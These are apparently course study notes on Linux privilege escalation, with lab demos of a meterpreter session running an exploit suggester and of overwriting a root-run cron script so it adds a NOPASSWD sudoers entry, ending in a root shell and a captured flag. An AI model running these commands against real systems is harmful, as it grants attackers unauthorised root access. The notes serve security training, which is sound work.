# Linux Kernel Exploits
- Kernel exploits on Linux will typically target vulnerabilites in the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
- This process will differ based on the Kernel version and distribution being targeted and the kernel exploit being used.
- Privesc on Linux systems will typically follow the following methodology:
  - Identifying kernel vulnerabilities
  - Downloading, compiling and transferring kernel exploits onto the target system.

## Tools & Environment
- Linux-Exploit-Suggester - This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.

## Demo: Linux Kernel Exploits

After we obtained a meterpreter session, we enumerate info:

`sysinfo`

`getuid`

www-data is a service account which is often used on linux system which host a webserver.
`shell`

`/bin/bash -i`

`cat /etc/passwd`

`sudo apt-get update`

We use the Linux Exploit Suggester:

meterpreter: `CD /TMP`

meterpreter: `ls`

meterpreter: `upload ~/Desktop/Linux-Enum/les.sh`

meterpreter: `shell`

meterpreter: `ls`

meterpreter: `chmod +x les.sh`

meterpeter: `ls -alps`

meterpeter: `./les.sh`

Gives us Exploits and OS information. We download the exploit from the website. Navigate to the Exploit download.

# Explooiting Misconfigured Cron Jobs 
- Linux implements task schedzuling through a utility called Cron.
- Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.
- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches
- The crontab file is a config file that is used by the Cron utility to store and track Cron jobs that have been created.

- Cron jobs can also be run as any user on the system, this is a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the "root" user.
- This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.
- In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.

## Demo: Exploiting Misconfigured Cron Jobs 

`whoami`

`groups student`

`cat /etc/passwd`

`crontab -l`

`ls al`

`cat message`

`pwd`

`cd /`

`grep -rnw /usr -e "/home/student/message"`

`ls -al /tmp`

`cat /tmp/message`

`ls -al /usr/local/share/copy.sh`

`cat /usr/local/share/copy.sh`

new tab

`printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh` 

`sudo -l`

`sudo su`

`whoami`

`cd /root`

`ls`

`cat flag`

`crontab -l`
